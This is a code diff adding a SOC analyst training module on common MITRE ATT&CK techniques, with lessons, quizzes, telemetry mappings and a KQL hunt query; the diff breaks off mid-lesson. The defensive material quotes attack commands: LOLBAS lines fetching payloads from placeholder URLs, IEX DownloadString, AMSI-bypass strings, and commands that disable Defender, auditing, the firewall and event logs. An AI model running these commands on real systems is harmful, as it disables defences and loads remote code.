@@ -6252,7 +6252,916 @@ This scenario shows how a single L1 ticket cascades into **9 escalation paths wi
         points=2,
     )
 
-    print(f"  L1: {course.title} — 7 modules, 51 lessons (Module 7 Escalation Workflow @ proper depth)")
+    # ── Module 8 — Common ATT&CK Techniques (L1 FINALE) ──────────────────
+    # Capstone lesson: ties Modules 1-7 together by walking the L1 through
+    # the ATT&CK techniques most often seen in real triage, anchored to
+    # the telemetry from prior modules. By the end the analyst can hear
+    # an alert, name the technique, predict corroborating telemetry, and
+    # feed the classification into the Module 7 escalation framework.
+    mod8 = _add_module(
+        session, course, order=8,
+        title="Common ATT&CK Techniques",
+        description_md=(
+            "L1 FINALE — the capstone module. The ATT&CK framework as "
+            "an L1 sees it (tactic / technique / sub-technique / "
+            "procedure, the matrices, Navigator, versioning); reading "
+            "a technique page in 30 s / 3 min / 30 min cadences; the "
+            "*top techniques* across Initial Access, Execution, "
+            "Persistence, Privilege Escalation, Defense Evasion, "
+            "Credential Access, Discovery, Lateral Movement, "
+            "Collection, Exfiltration, Impact, and C2 — anchored to "
+            "ECS / Sysmon / Defender Advanced Hunting fields and "
+            "tied back to Modules 3-7; the modal ransomware-affiliate "
+            "and cloud-takeover chains; mapping alert titles to "
+            "technique IDs on the fly; ION-specific (matcher tier "
+            "3 + tier 4); four worked scenarios — discovery cluster, "
+            "LSASS → DCSync, ransomware staging (T1490 → T1486), "
+            "edge-vuln → web-shell."
+        ),
+        estimated_minutes=240,
+    )
+
+    # Lesson 8.1 — Framework + reading technique pages + mapping on the fly
+    m8l1 = _add_lesson(
+        session, mod8, order=1,
+        title="The ATT&CK framework, reading a technique page, and mapping alerts on the fly",
+        lesson_type=LessonType.READING, duration_min=24,
+        content_md="""
+> **Learning objectives.** By the end of this lesson you'll be able to:
+> 1. Distinguish *tactic*, *technique*, *sub-technique*, and *procedure*, and articulate the four-tier hierarchy
+> 2. Navigate the Enterprise / Windows / Cloud / ICS matrix structure and recognise the role of ATT&CK Navigator
+> 3. Read a technique page in three cadences — *30-second*, *3-minute*, *30-minute* — and avoid the *zero-second read* anti-pattern
+> 4. Map an alert artefact to a technique ID *and* a sub-technique ID
+> 5. Recognise ATT&CK versioning (v15/v16 baseline; sub-tech overhaul, cloud-matrix reshuffles) and what to do when a cited ID doesn't render
+>
+> **Prerequisites.** Modules 1–7 (Alert Lifecycle through Escalation Workflow). This module is the L1 finale and assumes fluency with the telemetry from Modules 3 (Windows Event Logs), 4 (Network Telemetry), 6 (Phishing Triage), and the escalation framework from Module 7.
+
+## ATT&CK is a knowledge base, not a methodology
+
+ATT&CK is a **catalogue** of adversary behaviour — *what attackers do once they have access* — organised into a grid that defenders can use to talk about coverage, detection, and threat-actor TTPs in a single shared vocabulary. For an L1, the framework is best understood as a **lookup table**: an alert fires, you map the alert to a technique ID, and that ID unlocks a body of public knowledge about how the technique manifests, what telemetry betrays it, and what comes next in the kill chain.
+
+## The four-tier hierarchy
+
+ATT&CK Enterprise organises adversary behaviour into four nested concepts:
+
+- **Tactic** — the adversary's *goal* at a stage of an intrusion. 14 enterprise tactics, each with a `TA####` identifier:
+  - **TA0043** Reconnaissance · **TA0042** Resource Development
+  - **TA0001** Initial Access · **TA0002** Execution · **TA0003** Persistence · **TA0004** Privilege Escalation
+  - **TA0005** Defense Evasion · **TA0006** Credential Access · **TA0007** Discovery · **TA0008** Lateral Movement
+  - **TA0009** Collection · **TA0011** Command and Control · **TA0010** Exfiltration · **TA0040** Impact
+- **Technique** — *how* the goal is achieved. `T####` identifier (e.g. **T1059** Command and Scripting Interpreter).
+- **Sub-technique** — finer-grained variant. `T####.###` (e.g. **T1059.001** PowerShell). Sub-techniques were introduced in mid-2020 (the "sub-technique overhaul"); pre-2020 reporting often cites only the parent ID.
+- **Procedure** — a specific *instance* of a technique observed in real reporting. ATT&CK records procedures as `Group → Technique` or `Software → Technique` mappings (*"Mustang Panda has used scheduled tasks for persistence"*). Procedures are *evidence*, not classification, and cluster names rotate between vendors. **Cite the technique, not the actor, when in doubt.**
+
+A technique can belong to *multiple* tactics — `T1078 Valid Accounts` is simultaneously Initial Access, Persistence, Privilege Escalation, *and* Defense Evasion, because the same behaviour serves four goals at four phases.
+
+## Matrices and platforms
+
+Enterprise ATT&CK is rendered per-platform: **Windows / macOS / Linux** endpoints; **Cloud** (Azure AD/Entra ID, Office 365, Google Workspace, SaaS, IaaS); **Network** (routers/firewalls); **Containers** (K8s/Docker); **ESXi** (added 2024 in v15). Sister knowledge bases exist for **Mobile** (Android/iOS) and **ICS** (a different tactic list, e.g. *Inhibit Response Function*).
+
+L1s on a typical enterprise queue work overwhelmingly inside Enterprise/Windows + Enterprise/Cloud.
+
+## ATT&CK Navigator
+
+`mitre-attack.github.io/attack-navigator/` is a browser-based grid view. A **layer** is a colour-coded JSON overlay. Common types:
+
+- **Coverage layers** — your detection content mapped onto the matrix.
+- **Threat-actor layers** — every technique a tracked group has used.
+- **Detection-coverage overlays** — combine rule coverage with adversary behaviour to identify *gaps where detection is missing for techniques the relevant adversary uses*.
+
+Recognise that the colours encode *coverage*, not *prevalence* — green is "we can see it," not "it is happening now."
+
+## Versioning — IDs are sticky but not immutable
+
+ATT&CK ships major versions roughly twice a year. Inflection points:
+
+- **v6 (2019)** — pre-sub-technique baseline.
+- **v7 (mid-2020)** — sub-technique overhaul; many parent techniques split.
+- **v9–v10 (2021)** — Cloud platform broken out; Data Source taxonomy redesigned.
+- **v14 (late 2023)** — assets, mobile structured detections.
+- **v15 (early 2024)** — ESXi platform added.
+- **v16 (late 2024) / v17 (2025)** — cloud-matrix cleanup.
+
+A handful of techniques have been deprecated or merged. When citing, use the technique ID + name + ATT&CK version. *"If a technique number doesn't render on `attack.mitre.org`, search the technique name — it may have been merged or renumbered."*
+
+## Reading a technique page like an L1 — worked example: T1059.001 PowerShell
+
+A technique page has a fixed structure. You don't need to read the whole page on every alert; you need to know *where to jump.*
+
+| Section | What it gives you |
+|---|---|
+| **Description** | Plain-English what-is-it. Skim only when unfamiliar |
+| **Sub-techniques row** | The variant list — pick the one that matches your artefact |
+| **Procedure examples** | *"Group X has used …"* paragraphs. Useful for "is this in their playbook?" but **don't** quote group names into case metadata |
+| **Mitigations** | M-numbers; informs the question *"why didn't this get blocked?"* |
+| **Detections** | Analytic patterns — the L1's most-used section after Description |
+| **Data Sources / Components** | Post-2021 taxonomy: *Process: Process Creation*, *Command: Command Execution*, *Module: Module Load*, *Script: Script Execution* |
+| **References** | Public reporting; useful for novel-technique context, not for case metadata |
+
+### The 30-second / 3-minute / 30-minute reading cadence
+
+- **30-second read** — you've seen this 50 times before. Skim header, confirm sub-tech, copy ID into case. Done.
+- **3-minute read** — technique is familiar but the alert variant looks novel. Header → Sub-techniques row → Detection section → first three Procedure examples. Confirm "this is plausible" or spot "this isn't the right technique."
+- **30-minute read** — technique is unfamiliar; or you're writing a handover packet. Whole page plus 2+ cited references. Build a mental model of *why* the technique works.
+
+The error-state to avoid is the **zero-second read** — pasting the technique ID from the alert title without verifying the sub-tech matches the artefact. Half of mis-classified cases trace to this.
+
+### Worked snippet — artefact to technique
+
+```text
+process.parent.name  = "WINWORD.EXE"
+process.name         = "powershell.exe"
+process.command_line = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3..."
+```
+
+**30-second read on T1059.001.** Sub-tech is unambiguously **PowerShell**. `-enc` + `-w hidden` + `-nop` are explicitly called out in T1059.001's Detection section. Tag the case with **T1059.001** + **T1027.010** (Command Obfuscation, because `-enc` carries an encoded payload).
+
+**3-minute read.** Verify parent process. `WINWORD.EXE` parent of `powershell.exe` is also **T1204.002** (User Execution: Malicious File). Add it. The case now carries three precise technique IDs; ION's matcher tiers 3 and 4 will land cleanly.
+
+## Mapping ATT&CK Data Components to your stack
+
+| ATT&CK Data Component | Sysmon | Windows Event Log | Defender Advanced Hunting | ECS field |
+|---|---|---|---|---|
+| Process: Process Creation | EID 1 | 4688 | `DeviceProcessEvents` | `process.command_line`, `process.parent.name` |
+| Command: Command Execution | — | PowerShell 4104 | `DeviceProcessEvents` (CommandLine) | `process.command_line` |
+| Module: Module Load | EID 7 | PowerShell 4103 | `DeviceImageLoadEvents` | `dll.name`, `process.executable` |
+| Network Connection | EID 3 | — | `DeviceNetworkEvents` | `destination.ip`, `destination.domain`, `network.protocol` |
+| File Creation | EID 11 | — | `DeviceFileEvents` | `file.path`, `file.hash.sha256` |
+| Registry Set | EID 13 | — | `DeviceRegistryEvents` | `registry.path`, `registry.value` |
+| DNS Query | EID 22 | — | `DeviceNetworkEvents` (kind=DnsQuery) | `dns.question.name` |
+
+## Mapping alerts to ATT&CK on the fly
+
+The L1's daily reflex. Hear an alert title — *name* the technique. Drill these:
+
+| Alert title | Technique(s) | Reasoning |
+|---|---|---|
+| *"Anomalous PowerShell encoded command"* | **T1059.001** + **T1027.010** | PowerShell sub-tech; `-enc` = command obfuscation |
+| *"LSASS read by non-system process"* | **T1003.001** | OS Credential Dumping → LSASS Memory |
+| *"Service created from binary in user-writable path"* | **T1543.003** + **T1036.005** | Service-create persistence; user-writable path = masquerade |
+| *"Suspicious child of WINWORD"* | **T1204.002** + **T1059.{001\\|003\\|005}** | User opened malicious doc → script interpreter spawned |
+| *"DCSync from non-DC source"* | **T1003.006** | Replication API abuse from a workstation |
+| *"Inbox rule moves invoice keywords"* | **T1114.003** | Email forwarding/collection rule, Module 6 BEC |
+| *"vssadmin delete shadows"* | **T1490** | Inhibit System Recovery — *page everyone* |
+| *"Outbound to NRD via raw TLS"* | **T1071.001** + **T1573.002** | Web protocol C2 over TLS to newly-registered domain |
+| *"Kerberos TGS request with RC4 enc-type"* | **T1558.003** | Kerberoasting downgrade |
+| *"4624 NTLM logon type 9 from workstation"* | **T1550.002** | Pass-the-Hash signature |
+| *"Run-key value added pointing to %AppData%"* | **T1547.001** + likely **T1036.005** | Autostart persistence with masquerading path |
+| *"Outbound to AnyDesk on workstation without ticket"* | **T1219** | Remote Access Software (RMM abuse) |
+
+## Glossary
+
+- **Tactic / Technique / Sub-technique / Procedure** — the four-tier hierarchy.
+- **Sub-tech overhaul (mid-2020)** — when many parent techniques were split.
+- **30-second / 3-minute / 30-minute cadences** — the L1's three reading modes.
+- **Zero-second read** — the anti-pattern of accepting the alert's technique ID without verification.
+
+## Further reading
+
+- `attack.mitre.org/techniques/T1059/001/` — the worked example page.
+- `mitre-attack.github.io/attack-navigator/` — the layered grid view.
+- LOLBAS — `lolbas-project.github.io` — every signed Windows binary with abuse potential.
+- GTFOBins — Linux equivalent.
+""",
+    )
+    m8l1q = _add_lesson(
+        session, mod8, order=2, title="Framework & technique pages — quiz",
+        lesson_type=LessonType.QUIZ, duration_min=7,
+        content_md="Three questions on the four-tier hierarchy, technique-page reading discipline, and mapping an alert artefact to technique IDs.",
+    )
+    _add_q(session, m8l1q, order=1, kind=QuestionKind.SINGLE,
+        stem_md="In ATT&CK Enterprise's four-tier hierarchy, which level represents *a specific instance of a technique observed in real reporting*, e.g. *'Group X has used scheduled tasks for persistence'*?",
+        options=[
+            {"value": "tactic", "label": "Tactic"},
+            {"value": "technique", "label": "Technique"},
+            {"value": "subtech", "label": "Sub-technique"},
+            {"value": "procedure", "label": "Procedure"},
+        ],
+        correct="procedure",
+        explanation_md="Procedures are the named-instance level — `Group → Technique` or `Software → Technique` mappings drawn from public reporting. They are *evidence* of a technique, not classification, and cluster names rotate between vendors — so you cite the technique, not the procedure-author, in case metadata.",
+        points=2,
+    )
+    _add_q(session, m8l1q, order=2, kind=QuestionKind.MULTI,
+        stem_md="An alert fires with `process.parent.name = WINWORD.EXE`, `process.name = powershell.exe`, and `process.command_line = 'powershell.exe -nop -w hidden -enc SQBFAFgA...'`. Which technique IDs would a properly-tagged ION case carry?",
+        options=[
+            {"value": "t1059", "label": "T1059 (parent only — sub-tech omitted)"},
+            {"value": "t1059_001", "label": "T1059.001 (PowerShell sub-tech)"},
+            {"value": "t1027_010", "label": "T1027.010 (Command Obfuscation — for the `-enc` flag)"},
+            {"value": "t1204_002", "label": "T1204.002 (User Execution: Malicious File — WINWORD parent)"},
+            {"value": "t1003_001", "label": "T1003.001 (LSASS Memory)"},
+        ],
+        correct=["t1059_001", "t1027_010", "t1204_002"],
+        explanation_md="The artefact specifies the PowerShell sub-tech (.001), the encoded-command flag (T1027.010 Command Obfuscation), and the WINWORD parent (T1204.002 User Execution: Malicious File). Citing the *parent only* (T1059) drops precision that matters downstream for matcher tier 3 and case similarity. T1003.001 is unrelated — there's no LSASS access in this artefact.",
+        points=3,
+    )
+    _add_q(session, m8l1q, order=3, kind=QuestionKind.TRUEFALSE,
+        stem_md="ATT&CK technique IDs are immutable across versions — once an ID is assigned, it never deprecates, merges, or renumbers.",
+        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
+        correct="false",
+        explanation_md="**False.** IDs are *sticky* but not immutable. A small set has been renumbered or merged — most notably during the mid-2020 sub-technique overhaul (v7) and a cloud-matrix reshuffle around v10. *If a cited ID doesn't render on attack.mitre.org, search by name — it may have been merged or relocated.*",
+        points=2,
+    )
+
+    # Lesson 8.2 — Top techniques: IA + Execution + Persistence
+    m8l2 = _add_lesson(
+        session, mod8, order=3,
+        title="Top techniques: Initial Access, Execution, and Persistence",
+        lesson_type=LessonType.READING, duration_min=24,
+        content_md="""
+> **Learning objectives.** By the end of this lesson you'll be able to:
+> 1. Recognise the most-frequent **Initial Access** techniques an L1 sees — phishing, edge-vulnerability exploitation, valid-account abuse, external remote services, drive-by, trusted-relationship
+> 2. Identify the **Execution** workhorses — `T1059` script interpreters, `T1204` user execution, `T1218` LOLBAS, scheduled tasks, services
+> 3. Recognise the **Persistence** vectors — registry Run keys, services, scheduled tasks, account creation, account manipulation, DLL hijack/sideload, web shells, WMI subscriptions
+> 4. Cite the canonical telemetry fingerprints (Sysmon EIDs, Windows Event IDs, Defender Advanced Hunting tables, ECS fields) for each technique
+> 5. Use the LOLBAS / GTFOBins references when an unusual command-line for a signed binary appears
+
+## Initial Access (TA0001)
+
+### T1566 Phishing — already covered (Module 6)
+
+Sub-techniques: **.001 Spearphishing Attachment**, **.002 Spearphishing Link**, **.003 Spearphishing via Service** (LinkedIn / Teams / Discord), **.004 Spearphishing Voice** (vishing). Module 6 covered the triage moves; here, recognise the technique-page lens.
+
+### T1190 Exploit Public-Facing Application
+
+Adversary exploits a vuln on an internet-facing service (web app, VPN concentrator, file-transfer appliance). Recent canonical examples — *flag inline that this list dates*:
+
+- **Log4Shell (CVE-2021-44228)** — JNDI lookup in logged input.
+- **MOVEit Transfer (CVE-2023-34362)** — SQLi → file theft.
+- **Citrix Bleed (CVE-2023-4966)** — session-token disclosure on NetScaler/ADC.
+- **Ivanti Connect Secure (CVE-2023-46805 / CVE-2024-21887)**.
+- **Confluence / Outlook NTLM-leak / Fortinet SSL-VPN** — the reliable rotation.
+
+**Fingerprint.** Outbound shell from a process that *should not* spawn shells — `w3wp.exe` on IIS, `httpd` on Linux, `java` on Tomcat. Classic detection: child of a web-server process with `whoami`, `cmd.exe /c`, or `bash -i`.
+
+**ECS.** `process.parent.name = "w3wp.exe"`, `process.name in ("cmd.exe","powershell.exe","bash")`, `process.command_line` containing reconnaissance verbs.
+
+**Cross-reference.** Always pivot to the **CISA KEV catalogue**. If the affected product / CVE is in KEV, treat as confirmed-exploitation pattern and escalate (Module 7).
+
+### T1078 Valid Accounts
+
+Stolen, leaked, or sprayed credentials used to log in legitimately. Sub-techniques: **.001 Default**, **.002 Domain**, **.003 Local**, **.004 Cloud**.
+
+**Fingerprint.** Successful auth from anomalous source — geo, ASN, device fingerprint, time-of-day. Entra ID: sign-in risk = *high*; Defender for Identity: *Suspicious sign-in*.
+
+**Telemetry.** EID 4624 with anomalous source IP; Entra `SignInLogs.RiskLevelDuringSignIn`; `SignInLogs.ResultType`. For .003 Local: EID 4624 LT2/LT10 from an unexpected workstation.
+
+### T1133 External Remote Services
+
+RDP / VPN / Citrix / SSH / RDWeb / RD Gateway exposed to the internet, accessed with valid (or weak) credentials.
+
+**Fingerprint.** Successful RDP (LT10) from an external source IP; VPN concentrator log of new geo; SSH password auth where keys are policy. Pivot to user history: *first time this user has logged in from this geo / this device / this hour?*
+
+### T1195 / T1199 / T1189 — recognise but rarely L1-triaged
+
+- **T1195 Supply Chain Compromise** — software (.002), hardware, dependency confusion. Surfaces as a downstream alert (suspicious child process, beacon traffic).
+- **T1199 Trusted Relationship** — partner / contractor / MSP-channel access. Hallmark: service-principal or B2B-guest sign-in performing privileged actions outside expected scope.
+- **T1189 Drive-by Compromise** — browser exploit chain or fake-update lure (the *SocGholish* pattern — fake "Chrome update" delivering JS that runs `wscript`/`mshta`). Triage by parent-process tree: a script host child of a browser process is the giveaway.
+
+## Execution (TA0002)
+
+### T1059 Command and Scripting Interpreter — the workhorse
+
+Sub-techniques most common in L1 queues: **.001 PowerShell**, **.003 Windows Command Shell**, **.005 Visual Basic** (`wscript`/`cscript` running `.vbs` or VBA macros), **.006 Python**, **.007 JavaScript**.
+
+**Suspicious-PowerShell vocabulary** (memorise — these are the high-signal substrings):
+
+- `-EncodedCommand` / `-enc` (followed by base64)
+- `-ExecutionPolicy Bypass` / `-ep bypass`
+- `-NoProfile` / `-nop`
+- `-WindowStyle Hidden` / `-w hidden`
+- `IEX` (`Invoke-Expression`)
+- `DownloadString` / `DownloadFile` / `Net.WebClient`
+- `FromBase64String`
+- `Invoke-Mimikatz`, `Invoke-PSExec`, `Invoke-WMIExec`
+- `[Reflection.Assembly]::Load`
+- AMSI bypass strings: `AmsiUtils`, `amsiInitFailed`
+
+KQL — encoded / suspicious PowerShell across the estate:
+
+```kql
+DeviceProcessEvents
+| where Timestamp > ago(24h)
+| where FileName =~ "powershell.exe" or FileName =~ "pwsh.exe"
+| where ProcessCommandLine has_any ("-enc", "FromBase64String", "DownloadString", "IEX ", "Invoke-Expression", "amsi")
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
+| order by Timestamp desc
+```
+
+### T1204 User Execution
+
+**.001 Malicious Link**, **.002 Malicious File**. The Module-6 click-path joins ATT&CK here — user double-clicks the document/shortcut, macro/script executes, parent-process tree shows `WINWORD.EXE → cmd.exe → powershell.exe`. *"Suspicious child of WINWORD"* → almost always **T1204.002 → T1059.{001|003|005}**.
+
+### T1218 System Binary Proxy Execution — *Living Off The Land*
+
+A signed Microsoft binary used to execute arbitrary code, evading allow-listing. Common sub-techniques:
+
+- **.001 Compiled HTML File (.chm)** — `hh.exe` opens an .hta-equivalent.
+- **.003 CMSTP** — Connection Manager profile installer; abuses INF SCT scriptlets.
+- **.005 Mshta** — `mshta.exe http://.../payload.hta`.
+- **.007 Msiexec** — `msiexec /i http://.../x.msi /quiet`.
+- **.010 Regsvr32** — `regsvr32 /s /u /n /i:http://.../x.sct scrobj.dll` (Squiblydoo).
+- **.011 Rundll32** — `rundll32 javascript:"..."`.
+
+Reference: the **LOLBAS** project (`lolbas-project.github.io`) catalogues every signed Windows binary with abuse potential, the technique IDs each maps to, and example invocations. **GTFOBins** is the Linux analogue. When you see an unusual command-line for a signed binary, LOLBAS first.
+
+### T1053 Scheduled Task / Job
+
+**.005 Scheduled Task** on Windows. Both *execution* and *persistence*.
+
+- **Event IDs:** 4698 (Task Created), 4702 (Task Updated), 4700 (Task Enabled).
+- **Sysmon:** EID 1 with parent `svchost.exe -k netsvcs` (the host of the Schedule service).
+- **Command line:** `schtasks /create /tn "..." /tr "..." /sc minute /mo 1 /ru SYSTEM`.
+
+### T1569 System Services
+
+**.002 Service Execution** — PsExec class. SCM creates a service whose binary path is the payload, runs it as `LOCAL SYSTEM`, then deletes the service. **EID 7045** (service installed) + service-name pattern (random 16-char strings, or the literal `PSEXESVC`) is the canonical fingerprint.
+
+### T1106 Native API & T1559 IPC
+
+- **T1106 Native API** — direct calls into NT-level APIs (`NtCreateProcess`, `NtAllocateVirtualMemory`) bypassing higher-level wrappers. Rare to read directly, but EDR alerts naming *"direct syscall"* or *"Heaven's Gate"* are this.
+- **T1559.001 Component Object Model** — `MMC20.Application.ExecuteShellCommand` for lateral COM execution.
+- **T1559.002 Dynamic Data Exchange** — historic Office DDE-formula payload.
+
+## Persistence (TA0003)
+
+### T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
+
+The most common autostart vector. Watched paths:
+
+- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` and `…\\RunOnce`
+- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`
+- `%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`
+
+**Sysmon EID 13** (RegistryEvent — Value Set) is the primary signal. ECS: `registry.path`, `registry.value`.
+
+### T1543.003 Create or Modify System Process: Windows Service
+
+Service binary path points at the payload; survives reboot. **EID 7045**, **Sysmon EID 1** with parent `services.exe`.
+
+### T1136 Create Account
+
+- **.001 Local** — EID 4720 (User Account Created), 4732 (added to local group).
+- **.002 Domain** — EID 4720 + 4728 on a DC.
+- **.003 Cloud** — Entra `Add user` audit event; Microsoft Graph `Directory.ReadWrite.All` operations.
+
+### T1098 Account Manipulation
+
+- **.005 Device Registration** — the Module 6 AiTM finisher: attacker registers a rogue device into the victim's Entra tenant to satisfy compliant-device CA.
+- **.003 Additional Cloud Roles** — assigning *Global Administrator* / *Privileged Role Administrator* to a captured account.
+- **.001 Additional Cloud Credentials** — adding an OAuth client secret or certificate to a service principal (the BEC backdoor).
+
+### T1574 Hijack Execution Flow
+
+- **.001 DLL Search Order Hijacking** — drop a malicious `version.dll` next to a vulnerable signed exe; Windows resolves the DLL from the exe directory before `System32`.
+- **.002 DLL Side-Loading** — same idea, carrier is a legitimate signed app (commonly abused signed binaries from AV / printer-utility / Cisco vendors).
+
+### T1505.003 Server Software Component: Web Shell
+
+JSP / ASPX / PHP shell uploaded to a web server (China Chopper, Behinder, AntSword). Fingerprint: web-server process spawning a shell child (T1190 telemetry); short POST requests to a `.aspx` filename never seen before.
+
+### T1546.003 Event Triggered Execution: WMI Event Subscription
+
+A `__FilterToConsumerBinding` that fires on a system event, running a script. Detection: WMI activity log (`Microsoft-Windows-WMI-Activity/Operational`, EIDs 5860–5861) plus `mofcomp` invocations.
+
+## Glossary
+
+- **LOLBAS / GTFOBins** — catalogues of signed binaries with abuse potential (Windows / Linux).
+- **Run keys + Services + Scheduled Tasks + WMI** — the four most common Windows persistence surfaces.
+- **EID 7045** — service installed; the canonical T1543.003 / T1569.002 signal.
+- **EID 4698 / 4700 / 4702** — scheduled task created / enabled / updated.
+
+## Further reading
+
+- LOLBAS — `lolbas-project.github.io`.
+- CISA KEV catalogue — `cisa.gov/known-exploited-vulnerabilities-catalog`.
+- ATT&CK Navigator — `mitre-attack.github.io/attack-navigator/`.
+""",
+    )
+    m8l2q = _add_lesson(
+        session, mod8, order=4, title="IA + Execution + Persistence — quiz",
+        lesson_type=LessonType.QUIZ, duration_min=8,
+        content_md="Four questions on T1190 fingerprints, suspicious-PowerShell vocabulary, T1218 LOLBAS recognition, and persistence event-IDs.",
+    )
+    _add_q(session, m8l2q, order=1, kind=QuestionKind.SINGLE,
+        stem_md="An IIS server fires the alert *'Anomalous child process of w3wp.exe'* — the worker process for the OWA app pool has spawned `cmd.exe /c whoami & hostname`. Which ATT&CK technique most precisely fits the *root cause* of this signal?",
+        options=[
+            {"value": "t1059_003", "label": "T1059.003 — Windows Command Shell"},
+            {"value": "t1078", "label": "T1078 — Valid Accounts"},
+            {"value": "t1190", "label": "T1190 — Exploit Public-Facing Application"},
+            {"value": "t1547_001", "label": "T1547.001 — Registry Run Keys"},
+        ],
+        correct="t1190",
+        explanation_md="The `w3wp.exe` parent indicates web-application exploitation — T1190. The cmd shell child is T1059.003 *executed via* the T1190 foothold; both should be tagged on the case, but the *root* technique is T1190. Cross-reference the affected product / CVE against the CISA KEV catalogue and escalate per Module 7.",
+        points=2,
+    )
+    _add_q(session, m8l2q, order=2, kind=QuestionKind.MULTI,
+        stem_md="Which of the following PowerShell command-line substrings are reliable signals of suspicious activity worth elevating priority?",
+        options=[
+            {"value": "enc", "label": "`-EncodedCommand` or `-enc` followed by base64"},
+            {"value": "wp", "label": "`Get-Process` and `Get-Service`"},
+            {"value": "iex", "label": "`IEX (New-Object Net.WebClient).DownloadString(...)`"},
+            {"value": "amsi", "label": "AMSI-bypass strings like `AmsiUtils` or `amsiInitFailed`"},
+            {"value": "azc", "label": "`Get-AzContext` (Azure auth-context check)"},
+        ],
+        correct=["enc", "iex", "amsi"],
+        explanation_md="Encoded commands, `IEX` + `DownloadString` chains, and AMSI-bypass strings are reliably suspicious. `Get-Process` / `Get-Service` are normal admin tooling; `Get-AzContext` is benign developer / DevOps activity. Recognising these false-positive flavours quickly is part of the L1 reflex.",
+        points=3,
+    )
+    _add_q(session, m8l2q, order=3, kind=QuestionKind.SINGLE,
+        stem_md="A Windows event with **EID 7045** appears showing a service installed with a random 16-character name pointing at a binary in `%TEMP%`. Which technique pair best fits?",
+        options=[
+            {"value": "t1547_t1078", "label": "T1547.001 (Registry Run Keys) + T1078 (Valid Accounts)"},
+            {"value": "t1543_t1036", "label": "T1543.003 (Windows Service) + T1036.005 (Match Legitimate Name or Location)"},
+            {"value": "t1053_t1003", "label": "T1053.005 (Scheduled Task) + T1003.001 (LSASS Memory)"},
+            {"value": "t1190_t1505", "label": "T1190 + T1505.003 (Web Shell)"},
+        ],
+        correct="t1543_t1036",
+        explanation_md="EID 7045 with a random service name from `%TEMP%` is the canonical T1543.003 (Windows Service persistence) fingerprint, with a masquerading element (T1036.005) because the binary lives outside its expected install path. Random-name + user-writable path + service-create is also the PsExec / T1569.002 pattern variant.",
+        points=2,
+    )
+    _add_q(session, m8l2q, order=4, kind=QuestionKind.SHORTANSWER,
+        stem_md="Name the project that catalogues every signed Microsoft Windows binary with abuse potential, the technique IDs each maps to, and example invocations — the L1's first reference when an unusual command-line for a signed binary appears.",
+        options=None,
+        correct=["lolbas", "LOLBAS", "lolbas-project", "lolbas project"],
+        explanation_md="LOLBAS — *Living Off The Land Binaries, Scripts and Libraries* — at `lolbas-project.github.io`. Maps signed Windows binaries to ATT&CK technique IDs and example invocations. GTFOBins is the Linux analogue.",
+        points=2,
+    )
+
+    # Lesson 8.3 — PrivEsc + Defense Evasion + Cred Access + Discovery
+    m8l3 = _add_lesson(
+        session, mod8, order=5,
+        title="Privilege Escalation, Defense Evasion, Credential Access, and Discovery",
+        lesson_type=LessonType.READING, duration_min=24,
+        content_md="""
+> **Learning objectives.** By the end of this lesson you'll be able to:
+> 1. Recognise the **Privilege Escalation** techniques an L1 sees most often — process injection variants, token manipulation, UAC bypass, kernel/driver exploitation
+> 2. Identify **Defense Evasion** signals — obfuscation, log clearing, EDR/AV tampering, masquerading
+> 3. Walk the **Credential Access** family — LSASS dumping, DCSync, Kerberoasting / AS-REP roasting, Pass-the-Hash, brute force, MFA fatigue
+> 4. Recognise that **Discovery** is a *cluster signal*, not a single-command alert, and identify the post-foothold orientation pattern
+> 5. Pivot from EID 4662 with the replication GUID to T1003.006 instantly
+
+## Privilege Escalation (TA0004)
+
+- **T1068 Exploitation for Privilege Escalation** — kernel/driver exploit, **BYOVD** (*Bring Your Own Vulnerable Driver* — `gmer`, `RTCore64`, `kdmapper`-loadable drivers). Loaded-driver evidence in **Sysmon EID 6** and the Code-Integrity log.
+- **T1134 Access Token Manipulation** — **.001 Token Impersonation/Theft**, **.002 Create Process with Token**, **.005 SID-History Injection**.
+- **T1055 Process Injection** — **.001 DLL Injection**, **.002 PE Injection**, **.003 Thread Execution Hijacking**, **.012 Process Hollowing**, **.004 APC**, **.011 EWMI**. EDR alerts are the primary surface. **Sysmon EID 8** (CreateRemoteThread) and **EID 10** (ProcessAccess with high granted-access) are the classical signals.
+- **T1548.002 UAC Bypass** — `fodhelper.exe`, `eventvwr.exe`, `sdclt.exe` registry-hijack flavours.
+- **T1078 Valid Accounts** — also privilege escalation when a low-priv account inherits admin rights through a misconfiguration.
+
+**Common L1 mistake:** treating *every* T1055 alert as Privilege Escalation. T1055 is *primarily* defense evasion / process-context-cloak; it confers privilege only when injecting into a higher-integrity target. Look at source vs target integrity levels.
+
+## Defense Evasion (TA0005)
+
+### T1027 Obfuscated Files or Information
+
+- **.002 Software Packing** — UPX or custom packers.
+- **.006 HTML Smuggling** (Module 6) — JS-decoded blob constructed inside the browser.
+- **.010 Command Obfuscation** — Invoke-Obfuscation patterns; `^` carets in cmd; `${var}` PowerShell tricks; concatenated strings; backtick-escapes.
+
+### T1070 Indicator Removal
+
+- **.001 Clear Windows Event Logs** — `wevtutil cl Security`; **EID 1102** (Security log cleared); EID 104 (System log cleared).
+- **.003 Clear Command History** — `Clear-History`; deleting `ConsoleHost_history.txt`.
+- **.004 File Deletion** — payload self-deletes on completion.
+- **.006 Timestomp** — modifying file MAC times.
+
+### T1562 Impair Defenses
+
+- **.001 Disable or Modify Tools** — `sc stop Sense` (Defender for Endpoint sensor); `Set-MpPreference -DisableRealtimeMonitoring $true`; killing AV processes.
+- **.002 Disable Windows Event Logging** — `Set-Service -Name EventLog -StartupType Disabled`; `Auditpol /set /category:* /success:disable /failure:disable`.
+- **.004 Disable or Modify System Firewall** — `netsh advfirewall set allprofiles state off`.
+- **.009 Safe Mode Boot** — boot into Safe Mode to bypass EDR (a documented ransomware affiliate move).
+
+### T1036 Masquerading
+
+- **.001 Invalid Code Signature** — payload signed with stolen / unauthorised cert, or self-signed posing as a known vendor.
+- **.005 Match Legitimate Name or Location** — `svchost.exe` running from `%TEMP%`, `lsass.exe` running from `C:\\Users\\...`. The path is the giveaway, not the name.
+
